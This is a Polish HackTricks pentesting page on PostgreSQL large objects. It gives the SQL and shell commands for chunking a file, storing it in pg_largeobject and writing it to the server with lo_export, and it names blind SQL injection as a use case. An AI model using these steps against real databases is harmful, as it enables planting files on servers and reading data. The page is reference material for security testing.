<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

### Duże obiekty PostgreSQL

PostgreSQL oferuje strukturę znana jako **duże obiekty**, dostępne za pośrednictwem tabeli `pg_largeobject`, przeznaczoną do przechowywania dużych typów danych, takich jak obrazy lub dokumenty PDF. Ten podejście jest korzystne w porównaniu do funkcji `COPY TO`, ponieważ umożliwia **eksportowanie danych z powrotem do systemu plików**, zapewniając dokładną replikę oryginalnego pliku.

Aby **przechować kompletny plik** w tej tabeli, należy utworzyć obiekt w tabeli `pg_largeobject` (zidentyfikowany przez LOID), a następnie wstawić do tego obiektu kawałki danych o rozmiarze 2KB. Ważne jest, aby te kawałki miały dokładnie 2KB (z możliwym wyjątkiem ostatniego kawałka), aby funkcja eksportująca działała poprawnie.

Aby **podzielić swoje dane binarne** na kawałki o rozmiarze 2KB, można wykonać następujące polecenia:
```bash
split -b 2048 your_file # Creates 2KB sized files
```
Aby zakodować każdy plik w formacie Base64 lub Hex, można użyć poniższych poleceń:
```bash
base64 -w 0 <Chunk_file> # Encodes in Base64 in one line
xxd -ps -c 99999999999 <Chunk_file> # Encodes in Hex in one line
```
**Ważne**: Automatyzując ten proces, upewnij się, że wysyłasz fragmenty o rozmiarze 2 KB zwykłych bajtów. Pliki kodowane w formacie szesnastkowym będą wymagały 4 KB danych na fragment ze względu na podwojenie rozmiaru, podczas gdy pliki kodowane w formacie Base64 będą podlegać wzorcowi `ceil(n / 3) * 4`.

Zawartość dużych obiektów można przeglądać w celach debugowania za pomocą:
```sql
select loid, pageno, encode(data, 'escape') from pg_largeobject;
```
#### Używanie `lo_creat` i Base64

Aby przechowywać dane binarne, najpierw tworzony jest LOID:
```sql
SELECT lo_creat(-1);       -- Creates a new, empty large object
SELECT lo_create(173454);  -- Attempts to create a large object with a specific OID
```
W sytuacjach wymagających precyzyjnej kontroli, takich jak wykorzystanie Blind SQL Injection, preferowane jest użycie `lo_create` do określenia stałego LOID.

Kawałki danych mogą być następnie wstawiane w następujący sposób:
```sql
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (173454, 0, decode('<B64 chunk1>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (173454, 1, decode('<B64 chunk2>', 'base64'));

```
Aby wyeksportować i ewentualnie usunąć duży obiekt po użyciu:
```sql
SELECT lo_export(173454, '/tmp/your_file');
SELECT lo_unlink(173454);  -- Deletes the specified large object
```
#### Używanie `lo_import` i Hex

Funkcję `lo_import` można wykorzystać do utworzenia i określenia LOID dla dużego obiektu:
```sql
select lo_import('/path/to/file');
select lo_import('/path/to/file', 173454);
```
Po utworzeniu obiektu, dane są wstawiane na stronę, upewniając się, że każdy fragment nie przekracza 2KB:
```sql
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=0;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=1;
```
Aby zakończyć proces, dane są eksportowane, a duży obiekt jest usuwany:
```sql
select lo_export(173454, '/path/to/your_file');
select lo_unlink(173454);  -- Deletes the specified large object
```
### Ograniczenia

Zauważono, że **duże obiekty mogą mieć listy ACL** (Access Control Lists), które potencjalnie ograniczają dostęp nawet do obiektów utworzonych przez twojego użytkownika. Jednak starsze obiekty z przyzwoitymi listami ACL mogą nadal być dostępne do wycieku treści. 

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
